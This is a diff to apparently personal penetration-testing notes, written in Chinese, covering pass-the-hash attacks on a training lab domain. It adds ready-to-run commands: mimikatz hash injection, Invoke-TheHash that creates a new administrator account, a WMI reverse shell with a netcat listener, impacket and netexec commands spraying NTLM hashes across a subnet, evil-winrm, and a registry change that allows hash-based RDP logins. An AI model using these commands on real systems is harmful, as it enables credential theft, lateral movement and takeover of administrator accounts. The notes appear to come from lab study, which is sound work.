@@ -388,8 +388,48 @@ smbclient //10.129.232.180/HR -U jbader                                         
   xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
 
 
-
+哈希传递
+C:\> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit            弹出新cmd，dir \\dc01\julio 连接到 juliio 的共享
  
+
+PS:\> cd C:\tools\Invoke-TheHash\                                    通过 SMB 传递哈希，并新建 mark 用户，并加入 administrators 组
+PS:\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
+PS:\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
+  https://github.com/Kevin-Robertson/Invoke-TheHash
+
+https://www.revshells.com/      生成各类反向 Shell 二进制
+
+PS:\>.nc.exe -lvnp 8001
+PS:\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "二进制"      通过 WMI 传递哈希，获得反向 Shell
+
+
+impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453      Linux 传递哈希，登录目标
+工具包中还有其他几个工具可用于哈希传递：
+impacket-wmiexec
+impacket-atexec            通过计划任务
+impacket-smbexec
+
+
+netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 --local-auth          通过 smb，对整个网段传递哈希
+netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami      执行 whoami
+
+
+evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453      通过 winRM
+
+
+c:\> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f      启用“受限管理员模式”（Restricted Admin mode），允许哈希登录
+xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
+
+用户帐户控制 (User Account Control, UAC) 限制了本地用户执行远程管理操作
+当注册表项 HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy 设置为 0 时
+意味着内置的本地管理员帐户（RID-500，“Administrator”）是唯一允许执行远程管理任务的本地帐户
+将其设置为 1 也允许其他本地管理员执行这些任务
+有一个例外，如果注册表项 FilterAdministratorToken（默认禁用）被启用（值为 1），RID 500 帐户（即使它被重命名）也会被纳入 UAC 保护
+这意味着当使用该帐户时，针对该机器的远程 PTH 将会失败
+  参考资料：https://specterops.io/blog/2017/03/16/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/
+
+
+
 
 
 
@@ -405,11 +445,6 @@ Pass the Tickets (PtT):
   Enter-PSSession -ComputerName DC01
 
   https://github.com/GhostPack/Rubeus
-
-  Linux Mimikatz:  https://github.com/CiscoCXSecurity/linikatz
-
-Online-hash-crack:
-  https://crackstation.net/
 
 
 Proxies:
